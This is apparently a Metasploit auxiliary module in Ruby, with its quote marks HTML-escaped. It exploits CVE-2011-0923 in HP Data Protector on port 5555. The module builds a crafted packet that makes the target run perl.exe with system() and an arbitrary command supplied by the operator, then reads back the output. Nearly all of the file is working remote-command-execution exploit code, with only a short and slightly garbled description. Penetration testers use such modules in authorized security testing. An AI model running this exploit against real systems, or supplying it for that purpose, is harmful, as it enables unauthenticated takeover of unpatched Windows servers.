# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;    => &#039;HP Data Protector Arbitrary Remote Command Execution&#039;,
      &#039;Description&#039;  => %q{
        This script allows to execute a command with an arbitrary number
        of arguments on Microsoft Windows operating systems. The trick 
        inside the directory {install_path}/bin/.
        
        The main goal of the script is to bypass the limitation of execute
        only a single command without parameters, as provided by already existing
                                exploits. It is possible to exploit the security issue in order to run 
                                any command inside the target system. 
      },

      &#039;License&#039;  => MSF_LICENSE,
      &#039;Author&#039;        =>
        [
          &#039;Alessandro Di Pinto <alessandro.dipinto () artificialstudios org>&#039;,
          &#039;Claudio Moletta <mclaudio () gmail com>&#039;,
        ],
      &#039;References&#039;   =>
        [
          [ &#039;CVE&#039;, &#039;2011-0923&#039;],
          [ &#039;OSVDB&#039;, &#039;72526&#039;],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-055/&#039;],
          [ &#039;URL&#039;, &#039;http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143&#039;],
        ],
    ))

    register_options(
      [
        Opt::RPORT(5555),
        OptString.new(&#039;CMD&#039;, [ true, &#039;The OS command to execute&#039;, &#039;ipconfig /all&#039;])
      ], self.class)
  end

  def run
    begin
      command = datastore[&#039;CMD&#039;]
      command = command.gsub("\\","\\\\\\")
      offset = 45
          size_command = (offset + command.length).chr

      crafted_pkt = "\x00\x00\x00"
      crafted_pkt << size_command
      crafted_pkt << "\x32\x00\x01"
      crafted_pkt << "\x01\x01\x01"
      crafted_pkt << "\x01\x01\x00"
      crafted_pkt << "\x01\x00\x01"
      crafted_pkt << "\x00\x01\x00"
      crafted_pkt << "\x01\x01\x00"
      crafted_pkt << "\x2028\x00"
      crafted_pkt << "\\perl.exe"
      crafted_pkt << "\x00 -esystem(&#039;#{command}&#039;)\x00"

      print_status "Connecting to target &#039;#{rhost}:#{rport}&#039;"
      connect
      print_good "Connected"
        if (datastore[&#039;CMD&#039;])
        print_status "Sending payload &#039;#{command}&#039;\n"
        sock.put(crafted_pkt)
        # Clean and parse results
        while true
          response_size = sock.recv(4)
          response_size = response_size.unpack(&#039;N&#039;)[0]
          break if response_size.nil?
          response = sock.recv(response_size)[5..-1]
          response = response.delete("\x00")
          # Check for the end-of-message
          break if response.include?("RETVAL") 
          print response if not response.empty?
        end
      end
      disconnect

    rescue ::Rex::ConnectionRefused
      print_error "Connection refused &#039;#{rhost}:#{rport}&#039;"
    rescue ::Rex::ConnectionError
      print_error "Connection error &#039;#{rhost}:#{rport}&#039;"
    end
  end

end

